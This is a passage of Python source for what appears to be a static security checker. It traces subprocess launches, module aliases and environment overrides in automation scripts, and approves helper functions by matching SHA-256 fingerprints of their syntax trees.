        "all", "any", "bool", "bytes", "enumerate", "filter", "float", "frozenset",
        "hash", "hex", "id", "int", "iter", "len", "map", "max", "min", "next",
        "oct", "ord", "range", "repr", "reversed", "round", "sorted", "str", "sum",
        "tuple", "type", "zip",
    }

    def mutable_binding(scope: ast.AST, component: set[str], use: ast.AST) -> bool:
        for candidate in component:
            value = _python_binding_value(bindings, scope, candidate, use)
            if isinstance(value, (ast.List, ast.ListComp)):
                return True
            if (
                isinstance(value, ast.Call) and isinstance(value.func, ast.Name)
                and value.func.id == "list"
            ):
                return True
        return False

    # A local or otherwise unproven helper may mutate a list through its argument.
    # Invalidate only already-tracked mutable argv components, and never the proven
    # process sink itself, so ``subprocess.run(cmd)`` consumes rather than taints cmd.
    for scope in all_scopes:
        for node in source_nodes(scope):
            if not isinstance(node, ast.Call):
                continue
            if isinstance(node.func, ast.Name) and node.func.id in nonmutating_builtins:
                continue
            if _is_exact_bounded_helper_call(path, node, tree):
                continue
            if _resolved_python_process_callable(
                node.func, scope, bindings, process_modules,
                import_module_calls, imported_process_calls, set(),
            ) is not None:
                continue
            position = (node.lineno, node.col_offset)
            argument_names = {
                child.id
                for argument in (*node.args, *(keyword.value for keyword in node.keywords))
                for child in ast.walk(argument)
                if isinstance(child, ast.Name) and isinstance(child.ctx, ast.Load)
            }
            for name in argument_names:
                component = alias_component(scope, name, position)
                if not mutable_binding(scope, component, node):
                    continue
                for alias in component:
                    bindings.setdefault(scope, {}).setdefault(alias, []).append(
                        (*position, None)
                    )

    for scope_bindings in bindings.values():
        for history in scope_bindings.values():
            history.sort(key=lambda item: (item[0], item[1]))
    return bindings


def _python_binding_value(bindings, scope: ast.AST, name: str, use: ast.AST) -> ast.AST | None:
    writes = bindings.get(scope, {}).get(name, [])
    position = (getattr(use, "lineno", 10**9), getattr(use, "col_offset", 10**9))
    prior = [value for line, column, value in writes if (line, column) < position]
    # An opaque/conditional reaching write is unprovable; a later unconditional
    # write supersedes it in ordinary source order.
    return prior[-1] if prior else None


def _python_module_binding(bindings, name: str) -> tuple[bool, ast.AST | None, ast.AST | None]:
    """Return the last module-level binding for a free name, if one exists."""
    for candidate_scope, names in bindings.items():
        if not isinstance(candidate_scope, ast.Module):
            continue
        history = names.get(name, [])
        if history:
            return True, history[-1][2], candidate_scope
    return False, None, None


def _resolved_python_head(
    expression: ast.AST, scope: ast.AST, bindings: PythonBindings, seen: set[str] | None = None,
) -> str | None:
    seen = set() if seen is None else seen
    if isinstance(expression, ast.Name):
        value = _python_binding_value(bindings, scope, expression.id, expression)
        if expression.id in seen or value is None:
            return None
        return _resolved_python_head(value, scope, bindings, seen | {expression.id})
    if isinstance(expression, (ast.List, ast.Tuple)) and expression.elts:
        return _resolved_python_head(expression.elts[0], scope, bindings, seen)
    if isinstance(expression, ast.AugAssign) and isinstance(expression.op, ast.Add) and isinstance(expression.target, ast.Name):
        # Extending an existing argv list cannot replace its executable head.
        writes = bindings.get(scope, {}).get(expression.target.id, [])
        prior = [value for line, column, value in writes if (line, column) < (expression.lineno, expression.col_offset)]
        return _resolved_python_head(prior[-1], scope, bindings, seen) if prior and prior[-1] is not None else None
    if isinstance(expression, ast.Constant) and isinstance(expression.value, str):
        try:
            words = shlex.split(expression.value)
        except ValueError:
            return "<ambiguous>"
        return words[0] if words else "<ambiguous>"
    if isinstance(expression, ast.Call):
        call = expression
        if isinstance(call.func, ast.Name) and call.func.id == "str" and len(call.args) == 1:
            return _resolved_python_head(call.args[0], scope, bindings, seen)
        if isinstance(call.func, ast.Name) and call.func.id in {
            "trusted_executable_path", "python_child", "validated_child_command",
        }:
            return "/<validated-child>"
    return None


def _enclosing_function(node: ast.AST, parents: dict[ast.AST, ast.AST]) -> str | None:
    parent = parents.get(node)
    while parent is not None:
        if isinstance(parent, (ast.FunctionDef, ast.AsyncFunctionDef)):
            return parent.name
        parent = parents.get(parent)
    return None


def _enclosing_function_node(
    node: ast.AST, parents: dict[ast.AST, ast.AST],
) -> ast.FunctionDef | ast.AsyncFunctionDef | None:
    parent = parents.get(node)
    while parent is not None:
        if isinstance(parent, (ast.FunctionDef, ast.AsyncFunctionDef)):
            return parent
        parent = parents.get(parent)
    return None


def _function_parameter_names(function: ast.FunctionDef | ast.AsyncFunctionDef) -> set[str]:
    arguments = function.args
    return {
        argument.arg
        for argument in (*arguments.posonlyargs, *arguments.args, *arguments.kwonlyargs)
    } | ({arguments.vararg.arg} if arguments.vararg else set()) | (
        {arguments.kwarg.arg} if arguments.kwarg else set()
    )


def _run_safe_provenance(function: ast.FunctionDef | ast.AsyncFunctionDef) -> bool:
    """Accept only the test-maintained, complete installed helper structure."""
    fingerprint = _canonical_ast_bytes(function)
    return hashlib.sha256(fingerprint).hexdigest() == RUN_SAFE_AST_SHA256


def _canonical_ast_value(value: object) -> object:
    """Return a location-free AST value whose encoding is stable across Python releases."""
    if isinstance(value, ast.AST):
        fields = []
        for name, field_value in ast.iter_fields(value):
            # New Python releases add optional AST fields.  Their absent/empty
            # defaults carry no source semantics and must not perturb the digest.
            if field_value is None or field_value == []:
                continue
            fields.append([name, _canonical_ast_value(field_value)])
        return ["ast", type(value).__name__, fields]
    if isinstance(value, list):
        return ["list", [_canonical_ast_value(item) for item in value]]
    if isinstance(value, tuple):
        return ["tuple", [_canonical_ast_value(item) for item in value]]
    if value is None:
        return ["none"]
    if isinstance(value, bool):
        return ["bool", value]
    if isinstance(value, int):
        return ["int", str(value)]
    if isinstance(value, float):
        return ["float", value.hex()]
    if isinstance(value, complex):
        return ["complex", value.real.hex(), value.imag.hex()]
    if isinstance(value, str):
        return ["str", value]
    if isinstance(value, bytes):
        return ["bytes", value.hex()]
    if value is Ellipsis:
        return ["ellipsis"]
    raise TypeError(f"unsupported AST field value: {type(value).__name__}")


def _canonical_ast_bytes(node: ast.AST) -> bytes:
    return json.dumps(
        _canonical_ast_value(node), ensure_ascii=True, separators=(",", ":"),
    ).encode("ascii")


def _is_existing_parameterized_launcher(path: Path, node: ast.Call, parents: dict[ast.AST, ast.AST]) -> bool:
    function = _enclosing_function_node(node, parents)
    if function is None or not node.args or not isinstance(node.args[0], ast.Name):
        return False
    name = function.name
    argument = node.args[0].id
    parameters = _function_parameter_names(function)
    approved_name = _approved_script_name(path)
    if approved_name is None:
        return False
    expected_digest = APPROVED_FUNCTION_AST_SHA256.get((approved_name, name))
    if expected_digest is None or hashlib.sha256(_canonical_ast_bytes(function)).hexdigest() != expected_digest:
        return False
    if name == "run_bounded" and approved_name in {
        "run-opencode-busdriver-draft", "run-pi-busdriver-draft", "hermes-busdriver-pr-grind-loop",
        "hermes-busdriver-status", "hermes-busdriver-relay-brief", "hermes-busdriver-pr-grind-check",
        "hermes-busdriver-gate", "hermes-busdriver-smoke", "hermes-busdriver-lock",
        "hermes-busdriver-deliver", "hermes-busdriver-relay-role", "hermes-busdriver-agent-draft",
        "hermes-busdriver-delivery-status", "hermes-busdriver-litmus-status",
        "hermes-busdriver-finalization-readiness",
    }:
        return argument == "cmd" and "cmd" in parameters
    if (approved_name, name) == ("hermes-busdriver-agent-draft", "run_worker"):
        return argument == "cmd" and "cmd" in parameters
    if (approved_name, name) == ("busdriver-fs-broker.py", "run_git"):
        return argument == "argv" and "argv" in parameters
    if (approved_name, name) == ("hermes-busdriver-deliver", "run_safe"):
        return argument == "effective_argv" and "argv" in parameters and _run_safe_provenance(function)
    return False


def _is_exact_bounded_helper_call(path: Path, node: ast.Call, tree: ast.AST) -> bool:
    if not isinstance(node.func, ast.Name) or node.func.id not in BOUNDED_LAUNCHERS:
        return False
    approved_name = _approved_script_name(path)
    if approved_name is None:
        return False
    definitions = [
        child for child in ast.iter_child_nodes(tree)
        if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef))
        and child.name == node.func.id
    ]
    if len(definitions) != 1:
        return False
    expected_digest = APPROVED_FUNCTION_AST_SHA256.get((approved_name, node.func.id))
    return expected_digest is not None and (
        hashlib.sha256(_canonical_ast_bytes(definitions[0])).hexdigest() == expected_digest
    )


def _is_exact_bounded_forwarder(path: Path, node: ast.Call, parents: dict[ast.AST, ast.AST]) -> bool:
    function = _enclosing_function_node(node, parents)
    if function is None or not node.args or not isinstance(node.args[0], ast.Name):
        return False
    approved_name = _approved_script_name(path)
    if approved_name is None:
        return False
    expected_digest = APPROVED_FUNCTION_AST_SHA256.get((approved_name, function.name))
    if expected_digest is None or hashlib.sha256(_canonical_ast_bytes(function)).hexdigest() != expected_digest:
        return False
    expected = APPROVED_BOUNDED_FORWARDING_ARGUMENTS.get((approved_name, function.name))
    if function.name == "_bounded_run":
        expected = "cmd"
    if node.args[0].id != expected:
        return False
    # Parameter forwarding is identity-bound. The two installed local argv values are separately
    # constructed in their helpers and are named explicitly above; no other local is accepted.
    return expected in _function_parameter_names(function) or (approved_name, function.name) in {
        ("hermes-busdriver-deliver", "run_delivery_status"),
        ("hermes-busdriver-deliver", "git_observation_raw"),
        ("hermes-busdriver-deliver", "run_verifiers"),
        ("hermes-busdriver-litmus-status", "git"),
        ("hermes-busdriver-litmus-status", "branch_diff_hash"),
        ("hermes-busdriver-pr-grind-check", "run"),
    }


def _static_env_override(expression: ast.AST) -> bool:
    if not isinstance(expression, ast.Dict) or any(key is None for key in expression.keys):
        return False
    def static(value: ast.AST) -> bool:
        return isinstance(value, ast.Constant) and isinstance(value.value, str) or (
            isinstance(value, ast.Attribute) and isinstance(value.value, ast.Name)
            and value.value.id == "os" and value.attr == "devnull"
        )
    denied = {"LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "PYTHONPATH", "PYTHONHOME", "BASH_ENV", "ENV", "ZDOTDIR", "PATH"}
    return all(
        static(key) and static(value)
        and not (isinstance(key, ast.Constant) and key.value in denied)
        for key, value in zip(expression.keys, expression.values)
    )


def _approved_env_expression(
    path: Path, expression: ast.AST, dispatch: ast.Call, tree: ast.AST,
    parents: dict[ast.AST, ast.AST], approved_launcher: bool,
) -> bool:
    """Prove env provenance by exact helper bytes and source-order-aware assignment flow."""
    if approved_launcher:
        return True
    approved_name = _approved_script_name(path)
    functions = {
        node.name: node for node in ast.walk(tree)
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))
    }

    def sanitizer_call(value: ast.AST) -> bool:
        if not isinstance(value, ast.Call) or not isinstance(value.func, ast.Name):
            return False
        helper = functions.get(value.func.id)
        expected = APPROVED_ENV_SANITIZER_AST_SHA256.get((approved_name, value.func.id)) if approved_name else None
        if helper is None or expected is None:
            return False
        if hashlib.sha256(_canonical_ast_bytes(helper)).hexdigest() != expected:
            return False
        if value.args and not all(_static_env_override(arg) for arg in value.args):
            return False
        return not any(keyword.arg is None or not _static_env_override(keyword.value)
                       for keyword in value.keywords if keyword.arg not in {"allow_gh_repo"})

    if sanitizer_call(expression):
        return True
    if not isinstance(expression, ast.Name):
        return False
    scope = _enclosing_function_node(dispatch, parents) or tree
    writes: list[tuple[int, ast.AST | None]] = []
    for candidate in ast.walk(scope):
        if getattr(candidate, "lineno", dispatch.lineno + 1) >= dispatch.lineno:
            continue
        if isinstance(candidate, ast.Assign):
            for target in candidate.targets:
                if isinstance(target, ast.Name) and target.id == expression.id:
                    writes.append((candidate.lineno, candidate.value))
        elif isinstance(candidate, ast.AnnAssign) and isinstance(candidate.target, ast.Name) and candidate.target.id == expression.id:
            writes.append((candidate.lineno, candidate.value))
        elif isinstance(candidate, ast.AugAssign) and isinstance(candidate.target, ast.Name) and candidate.target.id == expression.id:
            writes.append((candidate.lineno, None))
    if writes and sanitizer_call(max(writes, key=lambda item: item[0])[1]):
        return True
    # The verifier environment is an exact reviewed inline allowlist; its whole
    # enclosing function fingerprint makes mutations or later writes fail closed.
    function = _enclosing_function_node(dispatch, parents)
    return bool(
        approved_name == "hermes-busdriver-deliver" and function is not None
        and function.name == "run_verifiers"
        and hashlib.sha256(_canonical_ast_bytes(function)).hexdigest()
        == APPROVED_FUNCTION_AST_SHA256[(approved_name, function.name)]
        and expression.id == "verifier_env"
    )


def _is_authenticated_broker_dispatch(path: Path, source: str, variable: str | None) -> bool:
    if _repo_relative_path(path) == "adapters/pi/busdriver-tools.ts" and variable == "python":
        return bool(
            re.search(r"function\s+broker\s*\([^)]*\)\s*:[^{]+\{", source)
            and re.search(r"const\s+python\s*=\s*process\.env\.BD_BROKER_PYTHON\s*;", source)
            and re.search(r"if\s*\(\s*!python\s*\|\|\s*!script\s*\)\s*throw\b", source)
        )
    return False


def _javascript_literal_bindings(source: str) -> dict[str, str]:
    """Resolve straightforward single-assignment string aliases without guessing dynamic values."""
    raw: dict[str, str] = {}
    ambiguous: set[str] = set()
    pattern = re.compile(
        r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=\s*(?:(['\"])(.*?)\2|([A-Za-z_$][\w$]*))\s*;",
        re.S,
    )
    for match in pattern.finditer(source):
        name = match.group(1)
        if name in raw:
            raw.pop(name, None); ambiguous.add(name); continue
        if name not in ambiguous:
            raw[name] = match.group(3) if match.group(2) else "@" + match.group(4)

    def resolve(name: str, seen: set[str]) -> str | None:
        if name in seen or name not in raw:
            return None
        value = raw[name]
        return resolve(value[1:], seen | {name}) if value.startswith("@") else value

    return {name: value for name in raw if (value := resolve(name, set())) is not None}


def _javascript_literal_at(source: str, name: str, position: int, seen: set[str] | None = None) -> str | None:
    """Resolve the last simple write before a use; every other write invalidates it."""
    seen = set() if seen is None else seen
    if name in seen:
        return None
    writes = list(re.finditer(
        rf"(?<![\w$])(?:(?:const|let|var)\s+)?{re.escape(name)}\s*(=|\+=|-=|\*=|/=|&&=|\|\|=|\?\?=)\s*([^;\n]*)",
        source[:position],
    ))
    if not writes or writes[-1].group(1) != "=":
        return None
    rhs = writes[-1].group(2).strip()
    literal = re.fullmatch(r"(['\"])(.*?)\1", rhs, re.S)
    if literal:
        return literal.group(2)
    alias = re.fullmatch(r"[A-Za-z_$][\w$]*", rhs)
    return _javascript_literal_at(source, alias.group(0), writes[-1].start(), seen | {name}) if alias else None


def _canonical_javascript_static_word_escapes(source: str) -> str:
    """Decode static JS escapes that can participate in names and module strings."""
    escape = re.compile(r"\\u(?:\{([0-9A-Fa-f]{1,6})\}|([0-9A-Fa-f]{4}))|\\x([0-9A-Fa-f]{2})")

    def replace(match: re.Match[str]) -> str:
        # An even-length run of preceding backslashes means this backslash is
        # itself escaped and therefore does not introduce a JavaScript escape.
        preceding = 0
        position = match.start() - 1
        while position >= 0 and source[position] == "\\":
            preceding += 1
            position -= 1
        if preceding % 2:
            return match.group(0)
        value = int(next(group for group in match.groups() if group is not None), 16)
        if value > 0x10FFFF:
            return match.group(0)
        decoded = chr(value)
        return decoded if re.fullmatch(r"[A-Za-z0-9_$:]", decoded) else match.group(0)

    return escape.sub(replace, source)


def _javascript_lexical_views(source: str) -> tuple[str, str]:
    """Return provenance and executable views with byte and line offsets intact.

    The provenance view retains literals so loader arguments can be resolved.  The
    executable view removes comments, strings, regex bodies, and template text,
    but recursively retains `${...}` expressions.
    """
    chars = list(source)
    executable = list(source)
    i = 0
    can_start_regex = True
    parens: list[str] = []
    braces: list[str] = []
    pending_control: str | None = None
    last_token: tuple[str, str] | None = None
    regex_keywords = {
        "await", "case", "delete", "do", "else", "in", "instanceof", "new", "return",
        "throw", "typeof", "void", "yield", "extends",
    }
    control_keywords = {"if", "while", "for", "with", "switch", "catch"}

    def blank(target: list[str], start: int, end: int) -> None:
        for position in range(start, end):
            if target[position] != "\n":
                target[position] = " "

    def quoted(start: int, quote: str) -> int:
        position = start + 1
        while position < len(source):
            if source[position] == "\\":
                position += 2; continue
            if source[position] == quote:
                return position + 1
            position += 1
        return len(source)

    def regex_literal_end(start: int) -> int:
        position = start + 1
        in_class = False
        while position < len(source):
            if source[position] == "\\":
                position += 2; continue
            if source[position] == "[":
                in_class = True
            elif source[position] == "]":
                in_class = False
            elif source[position] == "/" and not in_class:
                position += 1
                while position < len(source) and source[position].isalpha():
                    position += 1
                break
            elif source[position] == "\n":
                break
            position += 1
        return position

    def template(start: int) -> int:
        position = start + 1
        blank(executable, start, start + 1)
        while position < len(source):
            if source[position] == "\\":
                blank(executable, position, min(position + 2, len(source)))
                position += 2; continue
            if source[position] == "`":
                blank(executable, position, position + 1)
                return position + 1
            if source.startswith("${", position):
                executable[position] = " "; executable[position + 1] = " "
                position += 2
                depth = 1
                expression_can_start_regex = True
                while position < len(source) and depth:
                    if source[position] in "'\"":
                        end = quoted(position, source[position]); blank(executable, position, end)
                        position = end; expression_can_start_regex = False; continue
                    if source[position] == "`":
                        position = template(position); expression_can_start_regex = False; continue
                    if source.startswith("//", position):
                        end = source.find("\n", position)
                        end = len(source) if end < 0 else end
                        blank(chars, position, end); blank(executable, position, end)
                        position = end; continue
                    if source.startswith("/*", position):
                        end = source.find("*/", position + 2)
                        end = len(source) if end < 0 else end + 2
                        blank(chars, position, end); blank(executable, position, end)
                        position = end; continue
                    if source[position] == "/" and expression_can_start_regex:
                        end = regex_literal_end(position)
                        blank(executable, position, end)
                        position = end; expression_can_start_regex = False; continue
                    if source[position].isalpha() or source[position] in "_$":
                        end = position + 1
                        while end < len(source) and (source[end].isalnum() or source[end] in "_$"):
                            end += 1
                        expression_can_start_regex = source[position:end] in regex_keywords
                        position = end; continue
                    char = source[position]
                    if char == "{":
                        depth += 1; expression_can_start_regex = True
                    elif char == "}":
                        depth -= 1
                        if not depth:
                            executable[position] = " "; position += 1; break
                        expression_can_start_regex = False
                    elif char in ")]":
                        expression_can_start_regex = False
                    elif char in "([=,:!&|?*%<>~":
                        expression_can_start_regex = True
                    elif char in "+-" and position + 1 < len(source) and source[position + 1] == char:
                        position += 1
                    elif char in "+-":
                        expression_can_start_regex = True
                    elif char == "." or char.isdigit():
                        expression_can_start_regex = False
                    position += 1
                continue
            blank(executable, position, position + 1)
            position += 1
        return position

    while i < len(source):
        if source.startswith("//", i):
            end = source.find("\n", i)
            end = len(source) if end < 0 else end
            blank(chars, i, end); blank(executable, i, end)
            i = end; continue
        if source.startswith("/*", i):
            end = source.find("*/", i + 2)
            end = len(source) if end < 0 else end + 2
            blank(chars, i, end); blank(executable, i, end)
            i = end; continue
        if source[i] in "'\"":
            end = quoted(i, source[i]); blank(executable, i, end); i = end
            can_start_regex = False; last_token = ("operand", "string"); continue
        if source[i] == "`":
            i = template(i); can_start_regex = False; last_token = ("operand", "template"); continue
        if source[i] == "/" and can_start_regex:
            end = regex_literal_end(i)
            blank(executable, i, end); i = end
            can_start_regex = False; last_token = ("operand", "regex"); continue
        if source[i].isalpha() or source[i] in "_$":
            end = i + 1
            while end < len(source) and (source[end].isalnum() or source[end] in "_$"):
                end += 1
            word = source[i:end]
            pending_control = word if word in control_keywords and last_token != ("punct", ".") else None
            disallowed_for_of_prefixes = regex_keywords | control_keywords | {
                "async", "class", "const", "function", "get", "let", "set", "static", "var",
            }
            for_of_separator = (
                word == "of" and bool(parens) and parens[-1] == "for" and last_token is not None
                and (
                    last_token[0] == "word" and last_token[1] not in disallowed_for_of_prefixes
                    or last_token == ("punct", ")")
                    or last_token == ("punct", "]")
                    or last_token == ("punct", "}")
                )
            )
            can_start_regex = (
                word in regex_keywords and last_token != ("punct", ".")
            ) or for_of_separator
            last_token = ("word", word)
            i = end
            continue
        if not source[i].isspace():
            char = source[i]
            if char == "(":
                parens.append(pending_control or "ordinary")
                pending_control = None
                can_start_regex = True
            elif char == ")":
                kind = parens.pop() if parens else "unknown"
                # A completed control head is followed by a statement, where a
                # regex literal may lead an expression statement. A call/group
                # result is instead an expression operand, so slash is division.
                can_start_regex = kind in control_keywords or kind == "for-classic"
            elif char == "{":
                kind = "object" if can_start_regex else "block"
                braces.append(kind); can_start_regex = True
            elif char == "}":
                kind = braces.pop() if braces else "unknown"
                can_start_regex = kind == "block"
            elif char in "]":
                can_start_regex = False
            elif char == ";":
                if parens and parens[-1] == "for":
                    parens[-1] = "for-classic"
                can_start_regex = True
            elif char in "+-" and i + 1 < len(source) and source[i + 1] == char:
                # ``++``/``--`` preserve prefix/postfix expression context. In
                # particular, a postfix operator leaves the following slash as
                # division rather than opening a regex literal.
                i += 1
            elif char in "=,:([!&|?+-*%<>~":
                can_start_regex = True
            elif char == "." or char.isdigit():
                can_start_regex = False
            else:
                # Unknown punctuation is deliberately not treated as proof of
                # regex: leaving its following slash executable fails closed.
                can_start_regex = False
            last_token = ("punct", char)
        i += 1
    return "".join(chars), "".join(executable)


def _blank_javascript_comments(source: str) -> str:
    return _javascript_lexical_views(source)[0]


def _python_process_bindings(
    tree: ast.AST,
) -> tuple[set[str], set[str], set[str], set[str], set[str], set[str], set[str], set[str], set[str], set[str], dict[str, tuple[str, str]]]:
    """Return module aliases and conservatively imported process API aliases."""
    subprocess_modules = {"subprocess"}
    os_modules = {"os"}
    asyncio_modules = {"asyncio"}
    importlib_modules = {"importlib"}
    pty_modules = {"pty"}
    multiprocessing_modules = {"multiprocessing"}
    sys_modules = {"sys"}
    builtins_modules = {"builtins", "__builtins__"}
    import_calls = {"__import__"}
    import_module_calls: set[str] = set()
    imported: dict[str, tuple[str, str]] = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            for alias in node.names:
                if alias.name == "subprocess":
                    subprocess_modules.add(alias.asname or alias.name)
                elif alias.name == "os":
                    os_modules.add(alias.asname or alias.name)
                elif alias.name == "asyncio":
                    asyncio_modules.add(alias.asname or alias.name)
                elif alias.name == "importlib":
                    importlib_modules.add(alias.asname or alias.name)
                elif alias.name == "builtins":
                    builtins_modules.add(alias.asname or alias.name)
                elif alias.name == "pty":
                    pty_modules.add(alias.asname or alias.name)
                elif alias.name == "multiprocessing":
                    multiprocessing_modules.add(alias.asname or alias.name)
                elif alias.name == "sys":
                    sys_modules.add(alias.asname or alias.name)
        elif isinstance(node, ast.ImportFrom) and node.module in {"subprocess", "os", "asyncio", "pty", "multiprocessing"}:
            for alias in node.names:
                if alias.name != "*":
                    imported[alias.asname or alias.name] = (node.module, alias.name)
        elif isinstance(node, ast.ImportFrom) and node.module == "importlib":
            for alias in node.names:
                if alias.name == "import_module":
                    import_module_calls.add(alias.asname or alias.name)
        elif isinstance(node, ast.ImportFrom) and node.module == "builtins":
            for alias in node.names:
                if alias.name == "__import__":
                    import_calls.add(alias.asname or alias.name)

    # Accept only unambiguous name-to-name module aliases.  Assignments from calls,
    # attributes, parameters, or multiply assigned names remain deliberately opaque.
    assignments: dict[str, list[str | None]] = {}
    for node in ast.walk(tree):
        if isinstance(node, (ast.Assign, ast.AnnAssign)):
            targets = node.targets if isinstance(node, ast.Assign) else [node.target]
            value = node.value
            for target in targets:
                if isinstance(target, ast.Name):
                    assignments.setdefault(target.id, []).append(value.id if isinstance(value, ast.Name) else None)
    changed = True
    while changed:
        changed = False
        for target, values in assignments.items():
            if len(values) != 1 or values[0] is None:
                continue
            source = values[0]
            for modules in (subprocess_modules, os_modules, asyncio_modules, importlib_modules, builtins_modules, pty_modules, multiprocessing_modules, sys_modules):
                if source in modules and target not in modules:
                    modules.add(target); changed = True
            if source in import_calls and target not in import_calls:
                import_calls.add(target); changed = True
    return (subprocess_modules, os_modules, asyncio_modules, importlib_modules, builtins_modules,
            pty_modules, multiprocessing_modules, sys_modules, import_calls, import_module_calls, imported)


def _resolved_python_module(
    expression: ast.AST, scope: ast.AST, bindings: PythonBindings,
    modules: tuple[set[str], ...], import_module_calls: set[str],
    seen: set[str],
) -> str | None:
    if isinstance(expression, ast.Name):
        for module, names in zip(("subprocess", "os", "asyncio", "importlib", "builtins", "pty", "multiprocessing", "sys"), modules[:8]):
            if expression.id in names:
                return module
        value = _python_binding_value(bindings, scope, expression.id, expression)
        if expression.id in seen or value is None:
            return None
        return _resolved_python_module(
            value, scope, bindings, modules, import_module_calls,
            seen | {expression.id},
        )
    if not isinstance(expression, ast.Call):
        # sys.modules is the standard module registry; constant process-module
        # selection is resolvable and every other selection is process-opaque.
        if (isinstance(expression, ast.Subscript) and isinstance(expression.value, ast.Attribute)
                and expression.value.attr == "modules"
                and isinstance(expression.value.value, ast.Name)
                and expression.value.value.id in modules[7]):
            key = expression.slice
            if isinstance(key, ast.Constant) and key.value in {"subprocess", "os", "asyncio", "pty", "multiprocessing"}:
                return key.value
            return "<dynamic>"
        return None
    if (
        isinstance(expression.func, ast.Attribute) and expression.func.attr == "get"
        and isinstance(expression.func.value, ast.Attribute) and expression.func.value.attr == "modules"
        and isinstance(expression.func.value.value, ast.Name) and expression.func.value.value.id in modules[7]
    ):
        if expression.args and isinstance(expression.args[0], ast.Constant) and expression.args[0].value in {
            "subprocess", "os", "asyncio", "pty", "multiprocessing",
        }:
            return expression.args[0].value
        return "<dynamic>"
    loader = _resolved_python_loader(expression.func, scope, bindings, modules, import_module_calls, seen)
    is_import = loader == "import"
    is_import_module = (
        isinstance(expression.func, ast.Name) and expression.func.id in import_module_calls
        or isinstance(expression.func, ast.Attribute) and expression.func.attr == "import_module"
        and _resolved_python_module(
            expression.func.value, scope, bindings, modules, import_module_calls, seen
        ) == "importlib"
    )
    if loader == "dynamic":
        return "<dynamic>"
    if not (is_import or is_import_module or loader == "import_module"):
        return None
    if expression.args and isinstance(expression.args[0], ast.Constant) and expression.args[0].value in {
        "subprocess", "os", "asyncio", "pty", "multiprocessing",
    }:
        return expression.args[0].value
    return "<dynamic>"


def _resolved_python_loader(
    expression: ast.AST, scope: ast.AST, bindings: PythonBindings,
    modules: tuple[set[str], ...], import_module_calls: set[str], seen: set[str],
) -> str | None:
    """Resolve only standard loader objects and constant getattr spellings."""
    builtins_modules = modules[4]
    import_calls = modules[8]
    def builtin_getattr(candidate: ast.AST, getattr_seen: set[str]) -> bool:
        if isinstance(candidate, ast.Attribute) and candidate.attr == "getattr":
            return builtins_owner(candidate.value, set())
        if not isinstance(candidate, ast.Name): return False
        if candidate.id == "getattr":
            if isinstance(scope, (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)):
                if candidate.id in _function_parameter_names(scope): return False
            return not any(
                isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef))
                and node.name == candidate.id and node.lineno < candidate.lineno
                for node in ast.iter_child_nodes(scope)
            ) and _python_binding_value(bindings, scope, candidate.id, candidate) is None
        value = _python_binding_value(bindings, scope, candidate.id, candidate)
        if candidate.id in getattr_seen or value is None: return False
        return builtin_getattr(value, getattr_seen | {candidate.id})
    def builtins_owner(owner: ast.AST, owner_seen: set[str]) -> bool:
        if isinstance(owner, ast.Attribute) and owner.attr == "__dict__":
            return builtins_owner(owner.value, owner_seen)
        if isinstance(owner, ast.Call) and isinstance(owner.func, ast.Name) and owner.func.id == "vars" and owner.args:
            return builtins_owner(owner.args[0], owner_seen)
        if (isinstance(owner, ast.Subscript) and isinstance(owner.value, ast.Call)
                and isinstance(owner.value.func, ast.Name) and owner.value.func.id == "globals"
                and isinstance(owner.slice, ast.Constant) and owner.slice.value == "__builtins__"):
            return True
        if not isinstance(owner, ast.Name): return False
        if owner.id in builtins_modules: return True
        value = _python_binding_value(bindings, scope, owner.id, owner)
        if owner.id in owner_seen or value is None: return False
        return builtins_owner(value, owner_seen | {owner.id})
    if isinstance(expression, ast.Name):
        if expression.id in import_calls: return "import"
        if expression.id in import_module_calls: return "import_module"
        value = _python_binding_value(bindings, scope, expression.id, expression)
        if expression.id in seen or value is None: return None
        return _resolved_python_loader(value, scope, bindings, modules, import_module_calls, seen | {expression.id})
    if isinstance(expression, ast.Attribute) and expression.attr == "__import__":
        if builtins_owner(expression.value, set()): return "import"
    if isinstance(expression, ast.Subscript) and builtins_owner(expression.value, set()):
        member = expression.slice
        if isinstance(member, ast.Constant) and member.value == "__import__": return "import"
        return "dynamic"
    if isinstance(expression, ast.Subscript) and isinstance(expression.value, ast.Attribute) and expression.value.attr == "__dict__":
        owner_module = _resolved_python_module(expression.value.value, scope, bindings, modules, import_module_calls, seen)
        if owner_module == "importlib":
            member = expression.slice
            return "import_module" if isinstance(member, ast.Constant) and member.value == "import_module" else "dynamic"
    if isinstance(expression, ast.Call) and isinstance(expression.func, ast.Attribute) and expression.func.attr == "get":
        if builtins_owner(expression.func.value, set()) and expression.args:
            member = expression.args[0]
            return "import" if isinstance(member, ast.Constant) and member.value == "__import__" else "dynamic"
    if (
        isinstance(expression, ast.Call) and expression.args
        and isinstance(expression.func, ast.Call)
        and isinstance(expression.func.func, ast.Name) and expression.func.func.id == "getattr"
        and len(expression.func.args) >= 2
        and isinstance(expression.func.args[1], ast.Constant) and expression.func.args[1].value == "get"
        and builtins_owner(expression.func.args[0], set())
    ):
        member = expression.args[0]
        return "import" if isinstance(member, ast.Constant) and member.value == "__import__" else "dynamic"
    if isinstance(expression, ast.Attribute) and expression.attr == "import_module":
        if _resolved_python_module(expression.value, scope, bindings, modules, import_module_calls, seen) == "importlib": return "import_module"
    if isinstance(expression, ast.Call) and builtin_getattr(expression.func, set()) and len(expression.args) >= 2:
        member = expression.args[1]
        if isinstance(member, ast.Constant) and member.value in {"__import__", "import_module"}:
            owner = expression.args[0]
            if member.value == "__import__" and builtins_owner(owner, set()): return "import"
            if member.value == "import_module" and _resolved_python_module(owner, scope, bindings, modules, import_module_calls, seen) == "importlib": return "import_module"
        if builtins_owner(expression.args[0], set()) or _resolved_python_module(expression.args[0], scope, bindings, modules, import_module_calls, seen) == "importlib":
            return "dynamic"
    return None


def _python_bounded_launcher_aliases(tree: ast.AST) -> set[str]:
    """Retain proven and tainted names that may denote a bounded launcher."""
    aliases = set(BOUNDED_LAUNCHERS)
    assignments: dict[str, list[str | None]] = {}
    for node in ast.walk(tree):
        if not isinstance(node, (ast.Assign, ast.AnnAssign)):
            continue
        targets = node.targets if isinstance(node, ast.Assign) else [node.target]
        for target in targets:
            if isinstance(target, ast.Name):
